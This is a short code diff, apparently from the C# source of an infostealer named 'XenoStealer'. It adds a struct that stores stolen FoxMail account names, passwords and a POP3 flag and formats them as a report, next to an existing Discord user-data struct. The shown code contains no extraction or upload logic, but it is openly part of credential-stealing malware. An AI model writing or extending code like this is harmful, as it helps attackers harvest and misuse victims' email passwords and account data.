@@ -9,7 +9,27 @@ namespace XenoStealer
 {
     public static class DataExtractionStructs
     {
-
+        public struct FoxMailInfo 
+        {
+            public string account;
+            public string password;
+            public bool pop3;
+            public FoxMailInfo(string _account, string _password, bool _pop3) 
+            { 
+                account = _account;
+                password = _password;
+                pop3 = _pop3;
+            }
+            public override string ToString()
+            {
+                string result = "ACCOUNT: "+account;
+                result += Environment.NewLine;
+                result += "PASSWORD: " + password;
+                result += Environment.NewLine;
+                result += "POP3: " + pop3.ToString().ToUpper();
+                return result;
+            }
+        }
 
         public struct DiscordUserData 
         {
